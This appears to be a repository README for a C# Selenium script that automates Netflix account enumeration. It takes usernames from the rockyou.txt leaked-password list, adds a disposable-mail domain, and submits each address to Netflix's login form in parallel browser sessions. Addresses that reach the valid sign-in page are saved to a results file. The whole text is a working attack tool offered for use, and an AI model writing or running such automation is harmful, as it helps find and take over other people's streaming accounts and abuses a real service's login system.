# Netflix

### Download rockyou.txt file from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt and upload in side Helper folder


Source code: Program.cs
`
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace NetFlix.Login
{
    class Program
    {

        private static void Main(string[] args)
        {
            File.ReadLines(Constants.InputPath, Encoding.UTF8)
            .AsParallel().WithDegreeOfParallelism(5)
            .ForAll(email => AutomateNetflixBruteForce(email));
        }

        private static void AutomateNetflixBruteForce(string email)
        {

            var generatedEmail = generateEmail(email);

            if (!File.ReadLines(Constants.CheckedEmailPath, Encoding.UTF8).Contains(generatedEmail))
            {
                try
                {
                    using (IWebDriver driver = new FirefoxDriver())
                    {
                        driver.Navigate()
                            .GoToUrl(Constants.NavigationURL);

                        driver.FindElement(By.Name(Constants.Name_Email)).SendKeys(generatedEmail + Keys.Enter);


                        ValidateResult(driver, generatedEmail);


                        CleanUpDrivers(driver);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception occured email = {email}", ex);
                }
            }
        }
        private static string generateEmail(string email)
        {
            return $"{email.Trim()}{Constants.YopMailDomain}";
        }

        private static void ValidateResult(IWebDriver driver, string generatedEmail)
        {
            if (driver.Url == Constants.ValidSignInPage)
            {
                if (!File.Exists(Constants.OutputFile))
                {
                    CreateResultFile(Constants.OutputFile);
                }

                using (StreamWriter sw = File.AppendText(Constants.OutputFile))
                {
                    var emailAndDomain = generatedEmail.Split("@");
                    sw.WriteLineAsync($"{emailAndDomain[0]}\t\t{emailAndDomain[1]}\t\t{generatedEmail}");
                }

            }
            File.AppendAllTextAsync(Constants.CheckedEmailPath, generatedEmail + "\n");
        }

        private static void CleanUpDrivers(IWebDriver driver)
        {
            driver.Quit();
            driver.Dispose();
            Thread.Sleep(1000);
        }

        private static void CreateResultFile(string outputFile)
        {

            // Create a file to write to.
            using (StreamWriter sw = File.CreateText(outputFile))
            {
                sw.WriteLineAsync($"Account Details\t\tDomain\t\tEmail");
            }

        }
    }
}
`
